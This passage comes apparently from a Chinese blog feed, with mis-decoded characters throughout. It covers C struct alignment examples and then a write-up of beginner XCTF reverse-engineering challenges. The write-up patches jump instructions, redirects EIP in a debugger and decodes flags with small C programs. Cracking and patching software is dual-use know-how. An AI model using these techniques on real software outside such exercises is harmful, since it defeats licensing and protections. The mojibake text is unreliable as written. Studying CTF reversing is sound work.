ï¼ˆäº”ï¼‰/images/15735635119907.jpg" srcset="/img/loading.gif" alt="-w662"></p><p><strong>sizeof(Test) =4+4ï¼ˆè¡¥é½çš„ï¼‰+8+1+1+6ï¼ˆè¡¥é½çš„ï¼‰=24(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹å››åˆ†æï¼š"><a href="#æ¡ˆä¾‹å››åˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹å››åˆ†æï¼š"></a>æ¡ˆä¾‹å››åˆ†æï¼š</h4><div class="hljs"><pre><code>struct S1        {            char c;        double i;    };        </code></pre></div><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735636051365.jpg" srcset="/img/loading.gif" alt="-w530"></p><p><strong>sizeof(S1) =1+7ï¼ˆè¡¥é½çš„ï¼‰+8=16(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹äº”åˆ†æï¼š"><a href="#æ¡ˆä¾‹äº”åˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹äº”åˆ†æï¼š"></a>æ¡ˆä¾‹äº”åˆ†æï¼š</h4><div class="hljs"><pre><code>struct S2        {            int c1;         char c2[10]; };    </code></pre></div><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735636961393.jpg" srcset="/img/loading.gif" alt="-w547"></p><p><strong>sizeof(S2) =4+10+2ï¼ˆè¡¥é½çš„ï¼‰=16(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹å…­åˆ†æï¼š"><a href="#æ¡ˆä¾‹å…­åˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹å…­åˆ†æï¼š"></a>æ¡ˆä¾‹å…­åˆ†æï¼š</h4><div class="hljs"><pre><code>struct S3        {            char c1;         S1 s;            char c2;         char c3;     };</code></pre></div><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735637638057.jpg" srcset="/img/loading.gif" alt="-w539"></p><p><strong>sizeof(S3) =1+7+1ï¼ˆsä¸­çš„char cï¼‰+7ï¼ˆè¡¥é½çš„ï¼‰+8ï¼ˆsä¸­çš„doubleï¼‰+1+1+6ï¼ˆè¡¥é½çš„ï¼‰=32(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p><h4 id="æ¡ˆä¾‹ä¸ƒåˆ†æï¼š"><a href="#æ¡ˆä¾‹ä¸ƒåˆ†æï¼š" class="headerlink" title="æ¡ˆä¾‹ä¸ƒåˆ†æï¼š"></a>æ¡ˆä¾‹ä¸ƒåˆ†æï¼š</h4><div class="hljs"><pre><code>struct S4        {            char c1;         S1 s;            char c2;         double c3;     };    </code></pre></div><p><img src="/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/images/15735639114324.jpg" srcset="/img/loading.gif" alt="-w558"></p><p><strong>sizeof(S4) =1+7+1ï¼ˆsä¸­çš„char cï¼‰+7ï¼ˆè¡¥é½çš„ï¼‰+8ï¼ˆsä¸­çš„doubleï¼‰+1+7ï¼ˆè¡¥é½çš„ï¼‰+8=40(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xctf\_REæ–°æ‰‹åŒºWP</title>
    <link href="/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
    <url>/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Xctf-REæ–°æ‰‹åŒºWP"><a href="#Xctf-REæ–°æ‰‹åŒºWP" class="headerlink" title="Xctf_REæ–°æ‰‹åŒºWP"></a>Xctf_REæ–°æ‰‹åŒºWP</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å­¦cä¸åæ±‡ç¼–å­¦çš„æœ‰ç‚¹ç–²å€¦äº†ï¼Œä¸”å®é™…è¿ç”¨æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥æœ€è¿‘ä¸€å‘¨åˆ·äº†å¾ˆå¤šçš„Reå…¥é—¨é¢˜ï¼Œå·©å›ºçŸ¥è¯†ä¸”ç†Ÿæ‚‰ä¸‹ctfä¸­çš„REé¢˜ç›®ã€‚</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>ç¬¬ä¸€æ­¥ï¼Œå…ˆæŸ¥å£³ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15732702605654.jpg" srcset="/img/loading.gif" alt="-w625"><br>ï¼ˆæŸ¥å£³å¾ˆé‡è¦ï¼Œå¯ä»¥å…ˆç¡®è®¤æ˜¯å¦æœ‰å£³è¿˜å¯ä»¥çŸ¥é“ç¨‹åºæ˜¯ä»€ä¹ˆè¯­è¨€ç¼–å†™çš„ï¼‰<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733071101333.jpg" srcset="/img/loading.gif" alt="-w656"><br>çœ‹ä¸‹ç¨‹åºæ˜¯å¹²å˜›çš„ï¼Œä¹Ÿå°±æ˜¯ä½ è¾“å…¥flagç„¶åç¨‹åºå‡ºä¸ªåˆ¤æ–­æ˜¯å¦æ­£ç¡®ã€‚<strong>ä¼°è®¡å°±æ˜¯ä¸ªæ˜æ–‡å¯¹æ¯”</strong>ï¼Œç›´æ¥odæ‰“å¼€ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733074111357.jpg" srcset="/img/loading.gif" alt="-w911"><br>æ–­åœ¨äº†reæ¨¡å—ã€‚ç›´æ¥æœç´¢å­—ç¬¦ä¸²<img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733075097915.jpg" srcset="/img/loading.gif" alt="-w673"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733072667813.jpg" srcset="/img/loading.gif" alt="-w801"><br>æ‹¿åˆ°flag</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>è¿˜æ˜¯å…ˆæŸ¥å£³ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733077161080.jpg" srcset="/img/loading.gif" alt="-w519"><br>æ— å£³<br>è¿™é“é¢˜æœ‰å¤šç§åšæ³•ï¼Œä¸‹é¢å±•ç¤ºä¸‰ç§ï¼š</p><h3 id="ç¬¬ä¸€ç§"><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h3><p><strong>è¿™ä¸ªåšæ³•ä¸»è¦æ˜¯åˆ¤æ–­ç¨‹åºé€»è¾‘ï¼Œç„¶åæ”¹å…³é”®è·³è½¬çš„æ±‡ç¼–ä»£ç ï¼Œè¿›è¡Œçˆ†ç ´ç ´è§£ã€‚</strong><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733079095740.jpg" srcset="/img/loading.gif" alt="-w678"><br>å…ˆçœ‹ä¸‹ç¨‹åºæ˜¯åšä»€ä¹ˆçš„ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733079517175.jpg" srcset="/img/loading.gif" alt="-w545"><br>å…ˆè¾“å…¥ä¸ª1<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733079675395.jpg" srcset="/img/loading.gif" alt="-w507"><br>å‘ç°å›¾æ¡ˆä¸­ç¬¬1ï¼Œ2ï¼Œ8è¡Œå›¾å½¢å‘ç”Ÿäº†å˜åŒ–ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733082372049.jpg" srcset="/img/loading.gif" alt="-w659"><br>æ¥ç€è¾“å…¥2ï¼Œç„¶åç¬¬3ï¼Œ4ï¼Œ8è¡Œå›¾å½¢å‘ç”Ÿäº†å˜åŒ–ã€‚æ„Ÿè§‰æ²¡ä»€ä¹ˆè§„å¾‹ï¼Œå¤§æ¦‚çŒœä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯è¿™8è¡Œçš„çº¿æ¡å…¨éƒ¨è¿é€šå°±å¯ä»¥å®Œæˆè¿™ä¸ªæ¸¸æˆã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733085847753.jpg" srcset="/img/loading.gif" alt="-w607"></p><h4 id="æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æ"><a href="#æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æ" class="headerlink" title="æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æ"></a>æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æ</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733087052533.jpg" srcset="/img/loading.gif" alt="-w489"><br>å‘ç°ä¸€å †å‡½æ•°éš¾ä»¥æ‰¾åˆ°ä¸»å‡½æ•°ï¼ŒæŒ‰<code>shift+F12</code>æŸ¥çœ‹å­—ç¬¦ä¸²<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733088311433.jpg" srcset="/img/loading.gif" alt="-w909"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733088160599.jpg" srcset="/img/loading.gif" alt="-w865"><br>ç‚¹å‡»è¿™ä¸ªï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå­—ç¬¦ä¸²çš„äº¤å‰å¼•ç”¨ï¼Œç„¶åå¯ä»¥åŒå‡»è·³è½¬åˆ°mainå‡½æ•°ï¼Œçœ‹æ•´ä¸ªç¨‹åºçš„é€»è¾‘ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733091045568.jpg" srcset="/img/loading.gif" alt="-w746"></p><p>è·³è½¬å¥½åæŒ‰F5æŸ¥çœ‹ä¼ªä»£ç ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733092783647.jpg" srcset="/img/loading.gif" alt="-w471"><br>åœ¨ä¸‹æ–¹å‘ç°äº†ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œæ»¡è¶³åä¼šè°ƒç”¨sub_45Ab4è¿™ä¸ªå‡½æ•°ã€‚åŒå‡»è¿›å…¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733094560784.jpg" srcset="/img/loading.gif" alt="-w465"><br>å‘ç°ä¼šå‡ºç°è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733094810614.jpg" srcset="/img/loading.gif" alt="-w387"><br>è¿˜ç»è¿‡ä¸€å †æ•°æ®å’Œå¼‚æˆ–åè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚é‚£è¿™ä¸ªåº”è¯¥å°±æ˜¯è¿”å›flagäº†ã€‚<strong>é‚£å°±æ˜¯æƒ³åŠæ³•è®©ç¨‹åºè°ƒç”¨<code>sub_45Ab4</code>è¿™ä¸ªå‡½æ•°å°±å¯ä»¥äº†ã€‚</strong><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733096364506.jpg" srcset="/img/loading.gif" alt="-w307"><br>å†çœ‹ä¸€ä¸‹è¿™ä¸ªifè¯­å¥é‡Œé¢æ­£å¥½æ˜¯å¯¹ä¸€ä¸ªå®¹é‡ä¸º8çš„æ•°ç»„è¿›è¡Œåˆ¤æ–­ï¼Œå¯¹åº”åˆšåˆšç¨‹åºä¸­çš„8è¡Œï¼Œæ­£å¥½å¯¹åº”å½“8è¡Œç›´çº¿å…¨éƒ¨è¿æ¥ï¼ˆä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯å›¾æ¡ˆå…¨å˜ï¼‰å°±ä¼šè°ƒç”¨è¾“å‡ºflagçš„å‡½æ•°ã€‚</p><p>é‚£ç°åœ¨éœ€è¦åšçš„å°±å¾ˆæ˜ç¡®çš„ï¼Œç›´æ¥æ”¹ç¨‹åºæµç¨‹ï¼ŒIDAçš„patchæ˜¯å¯ä»¥åšåˆ°çš„ï¼Œç»“åˆåˆšåˆšæˆ‘ä»¬è¾“å…¥1çš„æ—¶å€™å›è®©1ï¼Œ2ï¼Œ8è¡Œè¿›è¡Œæ”¹å˜ï¼Œé‚£æˆ‘ä»¬å°±åœ¨è¿™å‡ å¤„åšæ”¹å˜å°±å¯ä»¥äº†ã€‚</p><h4 id="IDA-Patch"><a href="#IDA-Patch" class="headerlink" title="IDA Patch"></a>IDA Patch</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733100087904.jpg" srcset="/img/loading.gif" alt="-w423"><br>çœ‹ä¸»å‡½æ•°çš„æµç¨‹å›¾æ¨¡å¼ï¼Œä¸“é—¨æ‰¾è¿™ä¸ªè·³è½¬æŒ‡ä»¤JNZï¼Œæ•°ä¸€ä¸‹8ä¸ªå°±æ˜¯åˆšåˆšçš„8ä¸ªåˆ¤æ–­äº†ã€‚å¯¹åº”åˆšåˆšçš„æƒ³æ³•æˆ‘ä»¬åœ¨<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733100975029.jpg" srcset="/img/loading.gif" alt="-w394"><br>è¿™å‡ å¤„çš„æ±‡ç¼–ä»£ç è¿›è¡Œpatchï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733101571151.jpg" srcset="/img/loading.gif" alt="-w504"><br><strong>æŠŠJNZæ”¹æˆæ­£å¥½ç›¸åçš„JZ</strong><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733107484458.jpg" srcset="/img/loading.gif" alt="-w460"></p><p>ä¿®æ”¹å¥½åæŸ¥çœ‹ä¸‹ç”Ÿæˆçš„ä¼ªä»£ç <br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733107946575.jpg" srcset="/img/loading.gif" alt="-w375"><br>è¾¾åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚<br>ç„¶åæˆ‘ä»¬éœ€è¦æŠŠè¿™äº›æ‰“patchçš„åœ°æ–¹ä¿å­˜ä¸‹æ¥ï¼Œè®©å…¶æˆæ•ˆï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733103617647.jpg" srcset="/img/loading.gif" alt="-w1324"><br>ç‚¹å‡»okå³å¯ï¼Œå¯ä»¥ä¸ºäº†å®‰å…¨é€‰æ‹©ä¸€ä¸‹åšä¸ªbakå¤‡ä»½ã€‚</p><h4 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733108996551.jpg" srcset="/img/loading.gif" alt="-w564"><br>è¾“å…¥1<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733109139764.jpg" srcset="/img/loading.gif" alt="-w661"><br>æ‹¿åˆ°äº†flagã€‚</p><h3 id="ç¬¬äºŒç§"><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h3><p>è¿™ç§ä¸»è¦æ˜¯åœ¨IDAä¸­é™æ€åˆ†æåçŸ¥é“äº†ï¼Œåœ¨ç¨‹åºè°ƒç”¨è¾“å‡ºflagå‡½æ•°åflagå°±æ‰“å°å‡ºæ¥äº†ã€‚å°±å¯ä»¥æƒ³åŠæ³•åœ¨åŠ¨æ€è°ƒè¯•ä¸­ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°å°±å¯ä»¥äº†ã€‚é‡åœ¨IDAå’ŒODæ­é…ä½¿ç”¨äº†ã€‚</p><h4 id="IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€"><a href="#IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€" class="headerlink" title="IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€"></a>IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733116649387.jpg" srcset="/img/loading.gif" alt="-w829"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733116800264.jpg" srcset="/img/loading.gif" alt="-w702"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733118131519.jpg" srcset="/img/loading.gif" alt="-w688"><br>è®°ä½è¿™ä¸ª0045E940 åœ°å€ã€‚ä¸‹é¢ODç›´æ¥æƒ³åŠæ³•æ‰§è¡Œåˆ°è¯¥åœ°å€</p><h4 id="ODåŠ¨æ€è°ƒè¯•"><a href="#ODåŠ¨æ€è°ƒè¯•" class="headerlink" title="ODåŠ¨æ€è°ƒè¯•"></a>ODåŠ¨æ€è°ƒè¯•</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733122639383.jpg" srcset="/img/loading.gif" alt="-w498"><br>å‘ç°åŸºåœ°å€æ˜¯010F<br>åœ¨ODä¸­æœç´¢å­—ç¬¦ä¸²ï¼Œæ‰¾ä¸€ä¸‹æˆ‘ä»¬åº”è¯¥åœ¨å“ªä¸ªåœ°æ–¹æ‰¾ä¸€ä¸ªåˆé€‚çš„å¯ä»¥æ§åˆ¶çš„ä»£ç æ®µã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733124212188.jpg" srcset="/img/loading.gif" alt="-w692"><br>å‘ç°äº†è¾“å…¥nçš„è¯­å¥åœ°å€ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733124483702.jpg" srcset="/img/loading.gif" alt="-w695"><br>è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œè¿è¡Œç¨‹åºã€‚F9è®©ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œæ–­ä¸‹æ¥ã€‚æŒ‰ç©ºæ ¼ä¿®æ”¹ä¸‹æ±‡ç¼–ä»£ç <code>jmp 0x010FE490</code><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733126763356.jpg" srcset="/img/loading.gif" alt="-w688"></p><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733126850272.jpg" srcset="/img/loading.gif" alt="-w205"><br>è¿™æ—¶å€™çš„EIPï¼Œç„¶åå•æ­¥æ‰§è¡Œ<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733127939834.jpg" srcset="/img/loading.gif" alt="-w869"><br>è¿‡æ¥äº†ï¼Œåˆ°äº†è°ƒç”¨è¾“å‡ºflagçš„å‡½æ•°ã€‚ç„¶åæ¥ä¸‹æ¥ä¼šæœ‰å¾ˆå¤šå¾ªç¯å’Œå­—ç¬¦å¤„ç†çš„æ“ä½œï¼Œç›´æ¥å¯ä»¥æŒ‰CTRL+F8æŒ‰é”®è®©ODè‡ªåŠ¨æ‰§è¡Œã€‚è®©æŠŠè¿™ä¸ªå‡½æ•°å¤„ç†å®Œï¼Œå°±ä¼šå‡ºç°flagå­—ç¬¦ä¸²ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733127636852.jpg" srcset="/img/loading.gif" alt="-w674"></p><p>è¿™ç§ä¿®æ”¹EIPæ˜¯é‡ç‚¹å’Œæ‰¾åˆ°åˆé€‚å¯æ§åˆ¶ä»£ç æ®µæ˜¯é‡ç‚¹ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥<br>åœ¨æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶ä»£ç åï¼Œåœ¨æœç´¢å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733133763253.jpg" srcset="/img/loading.gif" alt="-w637"><br>å•å‡»è¿‡å»ï¼Œç„¶ååœ¨è¿™ä¸ªå‡½æ•°çš„å¼€å¤´è®¾ç½®ä¸ºæ–°çš„EIP<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733132918043.jpg" srcset="/img/loading.gif" alt="-w622"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733134257814.jpg" srcset="/img/loading.gif" alt="-w208"><br>ç„¶åæŒ‰ä¸€ä¸‹F8å°±æ¥åˆ°äº†è¿™ä¸ªå‡½æ•°é‡Œé¢äº†ã€‚å†è¿›è¡Œåˆšåˆšçš„æ“ä½œå°±å¯ä»¥äº†ã€‚</p><h3 id="ç¬¬ä¸‰ç§"><a href="#ç¬¬ä¸‰ç§" class="headerlink" title="ç¬¬ä¸‰ç§"></a>ç¬¬ä¸‰ç§</h3><p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æ‰¾åˆ°äº†å…³é”®å‡½æ•°ï¼Œåˆ†æä»¥åæ˜¯å¯ä»¥æŠŠè¿™ä¸ªå‡½æ•°æ˜¯å†™å‡ºæ¥çš„ï¼Œç„¶åæ ¹æ®ä¼ªä»£ç å†™å‡ºåŸæ¥çš„ç¨‹åºå°±å¯ä»¥äº†ã€‚</p><h4 id="ODé™æ€åˆ†æ"><a href="#ODé™æ€åˆ†æ" class="headerlink" title="ODé™æ€åˆ†æ"></a>ODé™æ€åˆ†æ</h4><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733137173061.jpg" srcset="/img/loading.gif" alt="-w682"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733137433462.jpg" srcset="/img/loading.gif" alt="-w521"><br>è°ƒç”¨å…¶å‡½æ•°ã€‚åŒå‡»è¿›å…¥F5ç”Ÿæˆä¼ªä»£ç ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733137975116.jpg" srcset="/img/loading.gif" alt="-w555"><br>ï¼ˆåªæ˜¯æˆªå–ä¸€éƒ¨åˆ†ï¼‰åˆ†æå¯ä»¥å¾—çŸ¥æ˜¯åˆ†æˆäº†2ä¸ªå­—ç¬¦æ•°ç»„ï¼Œä¸€ä¸ªV2åˆ°V58ï¼Œä¸€ä¸ªV59åˆ°V115ï¼Œéƒ½æ˜¯56çš„é•¿åº¦ï¼Œç„¶åä¸‹é¢å°±æ˜¯ä¸¤ä¸ªå¼‚æˆ–æ“ä½œäº†ã€‚ç›´æ¥æ”¹æˆCä»£ç ï¼Œå› ä¸ºè¿˜ä¸ä¼šå†™Pythonã€‚</p><div class="hljs"><pre><code>#include &lt;iostream&gt;#include &lt;string.h&gt;int main() {        int i;        char arr1[]={123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0};        char arr2[]={18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0};        for ( i = 0; i &lt; 56; ++i )        {            arr1[i] ^= arr2[i];            arr1[i] ^= 0x13u;        }        printf(&quot;%s&quot;,arr1);    return 0;}</code></pre></div><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733139966832.jpg" srcset="/img/loading.gif" alt="-w734"><br>è¿è¡Œå°±æ‹¿åˆ°äº†flagã€‚</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p>æ ¹æ®é¢˜ç›®æè¿°ï¼šèœé¸¡å‘ç°Flagä¼¼ä¹å¹¶ä¸ä¸€å®šæ˜¯æ˜æ–‡æ¯”è¾ƒçš„<br>è‚¯å®šæ˜¯è¿›è¡Œäº†æŸç§åŠ å¯†ã€‚</p><h3 id="å…ˆæŸ¥å£³"><a href="#å…ˆæŸ¥å£³" class="headerlink" title="å…ˆæŸ¥å£³"></a>å…ˆæŸ¥å£³</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733878960896.jpg" srcset="/img/loading.gif" alt="-w544"><br>æ— å£³ï¼Œ32ä½c++ç¨‹åº</p><h3 id="è¿è¡Œç¨‹åº"><a href="#è¿è¡Œç¨‹åº" class="headerlink" title="è¿è¡Œç¨‹åº"></a>è¿è¡Œç¨‹åº</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733879199369.jpg" srcset="/img/loading.gif" alt="-w431"><br>è¾“å…¥æ­£ç¡®çš„serialï¼Œä¼šæç¤ºæ­£ç¡®ã€‚</p><h3 id="IDAé™æ€åˆ†æ"><a href="#IDAé™æ€åˆ†æ" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733881777919.jpg" srcset="/img/loading.gif" alt="-w602"><br>è¿›å…¥mainå‡½æ•°ï¼ŒF5å¤§æ³•æŸ¥çœ‹ä¼ªä»£ç <br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733882559724.jpg" srcset="/img/loading.gif" alt="-w511"><br>å‘ç°æ˜¯v10æ•°ç»„ä¸v13æ•°ç»„é€å¯¹æ¯”åï¼Œå¦‚æœç›¸åŒå°±ä¼šè¾“å‡ºæ­£ç¡®çš„å­—çœ¼ã€‚å‰é¢æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„v9è¿›è¡Œä¸€äº›å¤„ç†ï¼Œå¤„ç†å®Œåä¼šæ”¾å…¥v10ä¸­ã€‚ä¸‹é¢å…·ä½“åˆ†æä¸€ä¸‹å¦‚ä½•å¤„ç†å°±å¯ä»¥äº†ï¼Œä¸»è¦åœ¨sprintfå‡½æ•°å’Œstrcatå‡½æ•°ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733887654757.jpg" srcset="/img/loading.gif" alt="-w379"><br>ç‚¹å‡»è¿›å»çœ‹åˆ°<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733887851687.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733888354402.jpg" srcset="/img/loading.gif" alt="-w632"><br>é‚£å°±å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯æŠŠv4å­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯åˆšåˆšè¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ ¼å¼åŒ–ä½16è¿›åˆ¶çš„æ•´æ•°è¾“å‡ºåˆ°v8ä¸­ï¼Œç„¶åç”¨strcatå‡½æ•°æŠŠå¤„ç†åçš„v8æ”¾å…¥v10ã€‚ï¼ˆæ­¤å¤„åŸæ¥çš„v10æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥è¿æ¥v10å’Œv8ï¼Œå®é™…ç›¸å½“äºæŠŠv8æ”¾å…¥v10ï¼‰</p><p>æ¥ä¸‹æ¥å°±æ˜¯v10ä¸v13è¿›è¡Œå¯¹æ¯”ï¼Œv13æ˜¯åˆšåˆšå¤åˆ¶è¿‡æ¥çš„<code>437261636b4d654a757374466f7246756e</code>ï¼Œé‚£å°±å¯ä»¥çœ‹å‡ºæ¥å’±ä»¬ç›´æ¥æŠŠè¿™ä¸ªè¿›è¡Œ16è¿›åˆ¶è½¬å›å»å°±å¯ä»¥äº†ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733891570437.jpg" srcset="/img/loading.gif" alt="-w526"></p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>è¿™é“é¢˜æ˜¯æ‹¿åˆ°äº†ä¸€æ®µcæºç ï¼Œæ‰“å¼€å‘ç°å…³é”®å¤„ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733897127019.jpg" srcset="/img/loading.gif" alt="-w1023"><br>å¯ä»¥çœ‹å‡ºæ¥æŠŠ<code>first second strlen(argv[3])</code>ææ¸…æ¥šæ˜¯ä»€ä¹ˆå°±å¯ä»¥äº†ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733897938110.jpg" srcset="/img/loading.gif" alt="-w590"><br>å¾ˆç®€å•å¯ä»¥çœ‹å‡ºè¿™3ä¸ªæ˜¯ä»€ä¹ˆå€¼ï¼Œä¸‹é¢ç›´æ¥æ”¾è§£å¯†ä»£ç ï¼š</p><div class="hljs"><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;int main(int argc, char *argv[]) {    unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207;    printf(&quot;Get your key: 